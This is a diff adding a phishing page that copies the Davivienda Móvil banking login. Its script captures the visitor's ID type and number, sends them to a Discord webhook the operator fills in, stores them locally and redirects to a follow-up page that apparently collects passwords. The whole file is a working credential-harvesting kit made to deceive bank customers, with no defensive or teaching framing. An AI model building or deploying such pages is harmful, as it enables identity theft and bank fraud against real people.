@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<title>Davivienda Móvil</title>
+<link href="css2" rel="stylesheet">
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+        background: #e6e6e6;
+        display: flex;
+        justify-content: center;
+        min-height: 100vh;
+    }
+
+    .app-container {
+        width: 100%;
+        max-width: 450px;
+        background: #f4f4f4;
+        min-height: 100vh;
+        position: relative;
+        box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        display: flex;
+        flex-direction: column;
+    }
+
+    .header {
+        background: #da291c;
+        height: 130px;
+        display: flex;
+        justify-content: center;
+        align-items: flex-end;
+        padding-bottom: 20px;
+        position: relative;
+    }
+
+    .header-logo svg {
+        width: 60px;
+        height: auto;
+        fill: none;
+        stroke: white;
+        stroke-width: 2;
+    }
+
+    .content {
+        padding: 20px 30px;
+        flex: 1;
+    }
+
+    .back-btn {
+        display: flex;
+        align-items: center;
+        color: #555;
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 30px;
+        cursor: pointer;
+    }
+
+    .back-btn svg {
+        width: 12px;
+        height: 12px;
+        margin-right: 10px;
+        fill: #555;
+    }
+
+    .input-label {
+        font-size: 15px;
+        color: #333;
+        font-weight: 500;
+        margin-bottom: 10px;
+        display: block;
+    }
+
+    .input-group {
+        background: #fff;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        height: 50px;
+        display: flex;
+        align-items: center;
+        padding: 0 15px;
+        margin-bottom: 25px;
+        position: relative;
+    }
+
+    .input-group img, .input-group svg {
+        width: 24px;
+        height: 24px;
+        margin-right: 12px;
+        opacity: 0.6;
+    }
+
+    select {
+        width: 100%;
+        border: none;
+        outline: none;
+        background: transparent;
+        font-size: 16px;
+        color: #333;
+        appearance: none;
+        -webkit-appearance: none;
+        position: relative;
+        z-index: 2;
+    }
+
+    .arrow-icon {
+        position: absolute;
+        right: 15px;
+        pointer-events: none;
+        width: 14px !important;
+        height: 14px !important;
+    }
+
+    input {
+        width: 100%;
+        border: none;
+        outline: none;
+        font-size: 16px;
+        color: #333;
+    }
+    
+    input::placeholder {
+        color: #aaa;
+    }
+
+    .forgot-link {
+        text-align: center;
+        display: block;
+        color: #333;
+        font-size: 14px;
+        font-weight: 600;
+        margin: 10px 0 30px 0;
+        text-decoration: none;
+    }
+
+    .submit-btn {
+        width: 100%;
+        height: 48px;
+        border-radius: 24px;
+        border: none;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: 0.3s;
+        background: #cccccc;
+        color: #fff;
+        margin-bottom: 40px;
+    }
+
+    .submit-btn.active {
+        background: #da291c;
+    }
+
+    .qr-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+        margin-bottom: 20px;
+        margin-top: auto;
+    }
+
+    .qr-bar {
+        background: #da291c;
+        width: 280px;
+        height: 40px;
+        border-radius: 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0 25px;
+        color: white;
+        font-size: 14px;
+        font-weight: 500;
+    }
+
+    .qr-center-btn {
+        position: absolute;
+        width: 48px;
+        height: 48px;
+        background: white;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        left: 50%;
+        transform: translateX(-50%);
+    }
+
+    .qr-center-btn svg {
+        width: 24px;
+        height: 24px;
+        fill: #333;
+    }
+
+    .footer-text {
+        text-align: center;
+        font-size: 11px;
+        color: #888;
+        padding-bottom: 20px;
+        line-height: 1.4;
+    }
+
+    .support-float {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        width: 55px;
+        height: 55px;
+        background: #da291c;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        z-index: 100;
+    }
+    
+    .support-float svg {
+        width: 30px;
+        height: 30px;
+        fill: white;
+    }
+
+</style>
+</head>
+<body>
+
+<div class="app-container">
+    
+<div class="header">
+    <div class="header-logo" style="
+        width: 70px;
+        height: 70px;
+        background: url('https://i.postimg.cc/xCzwGQ37/image-removebg-preview-(11).png') no-repeat center/contain;
+    ">
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="back-btn">
+            <svg viewBox="0 0 320 512"><path d="M34.52 239.03L228.87 44.69c9.37-9.37 24.57-9.37 33.94 0l22.67 22.67c9.36 9.36 9.37 24.52.04 33.9L131.49 256l154.02 154.75c9.34 9.38 9.32 24.54-.04 33.9l-22.67 22.67c-9.37 9.37-24.57 9.37-33.94 0L34.52 272.97c-9.37-9.37-9.37-24.57 0-33.94z"></path></svg>
+            Atrás
+        </div>
+
+        <form id="formulario">
+        
+            <label class="input-label">Seleccione el tipo de documento</label>
+            <div class="input-group">
+                <svg viewBox="0 0 24 24" fill="#555"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 10h2v2H6zm0 4h8v2H6zm10 0h2v2h-2zm-6-4h8v2h-8z"></path></svg>
+                
+                <select name="tipo_documento" id="tipo_documento">
+                    <option value="CC" selected>Cédula de ciudadanía</option>
+                    <option value="CE">Cédula de extranjería</option>
+                    <option value="PP">Pasaporte</option>
+                </select>
+
+                <svg class="arrow-icon" viewBox="0 0 24 24" fill="#333"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"></path></svg>
+            </div>
+
+            <label class="input-label">Ingrese el número de documento</label>
+            <div class="input-group">
+                <input type="tel" id="documento" name="documento" placeholder="Número de documento" maxlength="15" autocomplete="off">
+            </div>
+
+            <a href="#" class="forgot-link">¿Olvidó o bloqueó su clave virtual?</a>
+
+            <button type="submit" id="btn-submit" class="submit-btn" disabled="">Iniciar sesión</button>
+        </form>
+        
+
+        <div class="qr-container">
+            <div class="qr-bar">
+                <span>Leer QR</span>
+                <span>Generar QR</span>
+            </div>
+            <div class="qr-center-btn">
+                <svg viewBox="0 0 24 24"><path d="M3 3h8v8H3zm2 2v4h4V5zm8-2h8v8h-8zm2 2v4h4V5zM3 13h8v8H3zm2 2v4h4v-4zm8-2h8v8h-8zm2 2v4h4v-4z" fill="#333"></path></svg>
+            </div>
+        </div>
+
+        <div class="footer-text">
+            Términos y condiciones<br>V7.5.0
+        </div>
+        </div>
+    </div>
+
+    
+</div>
+
+<script>
+  // ⚙️ CONFIGURACIÓN DEL WEBHOOK
+  const WEBHOOK_URL = 'https://discord.gg/XrhsAWeHK'; // 👈 COLOCA AQUÍ TU WEBHOOK URL DE DISCORD
+
+  const form = document.getElementById("formulario");
+  const input = document.getElementById("documento");
+  const btn = document.getElementById("btn-submit");
+  const select = document.getElementById("tipo_documento");
+
+  // INPUT: solo números + activar botón
+  input.addEventListener("input", () => {
+    input.value = input.value.replace(/\D/g, "");
+
+    if (input.value.length > 0) {
+      btn.classList.add("active");
+      btn.removeAttribute("disabled");
+    } else {
+      btn.classList.remove("active");
+      btn.setAttribute("disabled", "true");
+    }
+  });
+
+  // 🚀 FUNCIÓN PARA ENVIAR A DISCORD
+  async function enviarADiscord(tipoDoc, numDoc) {
+    try {
+      const fecha = new Date().toLocaleString('es-CO', { 
+        timeZone: 'America/Bogota',
+        dateStyle: 'full',
+        timeStyle: 'medium'
+      });
+
+      const mensaje = {
+        embeds: [{
+          title: "🏦 Nuevo Acceso - Davivienda",
+          color: 0xDA291C, // Color rojo de Davivienda
+          fields: [
+            {
+              name: "📋 Tipo de Documento",
+              value: tipoDoc === 'CC' ? 'Cédula de Ciudadanía' : 
+                     tipoDoc === 'CE' ? 'Cédula de Extranjería' : 
+                     'Pasaporte',
+              inline: true
+            },
+            {
+              name: "🔢 Número de Documento",
+              value: numDoc,
+              inline: true
+            },
+            {
+              name: "🕒 Fecha y Hora",
+              value: fecha,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "Sistema de Notificaciones Davivienda"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(mensaje)
+      });
+
+      if (response.ok) {
+        console.log('✅ Datos enviados a Discord correctamente');
+      } else {
+        console.error('❌ Error al enviar a Discord:', response.status);
+      }
+    } catch (error) {
+      console.error('❌ Error en la petición a Discord:', error);
+    }
+  }
+
+  // SUBMIT: guardar TODO, enviar a Discord y redirigir
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    if (!input.value) return;
+
+    const tipoDoc = select.value;
+    const numDoc = input.value;
+
+    // 🔒 GUARDAR EN LOCALSTORAGE
+    localStorage.setItem("tipo_documento", tipoDoc);
+    localStorage.setItem("documento", numDoc);
+
+    // 📤 ENVIAR A DISCORD
+    await enviarADiscord(tipoDoc, numDoc);
+
+    // 👉 REDIRECCIÓN
+    window.location.href = "clvs.html";
+  });
+</script>
+
+<script>
+(() => {
+  const ALLOW = new Set([
+    location.hostname,
+    "www.youtube.com",
+    "player.vimeo.com",
+  ]);
+
+  const BLOCKED = [
+    "https://www.google.com/",
+    "https://google.com/",
+  ];
+
+  function hostOf(url) {
+    try { return new URL(url, location.href).hostname; }
+    catch { return ""; }
+  }
+
+  function isAllowedIframe(iframe) {
+    const src = (iframe.getAttribute("src") || "").trim();
+    if (!src) return true;
+    const h = hostOf(src);
+    return ALLOW.has(h);
+  }
+
+  function looksBlockedByPolicy(src) {
+    if (!src) return false;
+    return BLOCKED.some(b => src.startsWith(b));
+  }
+
+  function replaceWithFallback(iframe, src) {
+    const box = document.createElement("div");
+    box.style.cssText = `
+      border:1px solid #e5e5ea; padding:14px; border-radius:12px;
+      font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+      background:#fff; max-width:520px;
+    `;
+    box.innerHTML = `
+      <div style="font-weight:600;margin-bottom:6px;">Este contenido no se puede mostrar aquí</div>
+      <div style="color:#666;font-size:14px;margin-bottom:10px;">
+        El sitio bloquea ser cargado dentro de un iframe por seguridad.
+      </div>
+      <a href="${src}" target="_blank" rel="noopener noreferrer"
+         style="display:inline-block;background:#007aff;color:#fff;text-decoration:none;
+                padding:10px 12px;border-radius:10px;font-weight:600;">
+        Abrir en otra pestaña
+      </a>
+    `;
+    iframe.replaceWith(box);
+  }
+
+  function cleanIframes() {
+    document.querySelectorAll("iframe").forEach(iframe => {
+      const src = (iframe.getAttribute("src") || "").trim();
+
+      if (looksBlockedByPolicy(src)) {
+        replaceWithFallback(iframe, src);
+        return;
+      }
+
+      if (!isAllowedIframe(iframe)) {
+        console.warn("Iframe bloqueado por seguridad:", src);
+        iframe.remove();
+      }
+    });
+  }
+
+  cleanIframes();
+
+  const obs = new MutationObserver(() => cleanIframes());
+  obs.observe(document.documentElement, { childList: true, subtree: true });
+
+})();
+</script>
+
+</body></html>
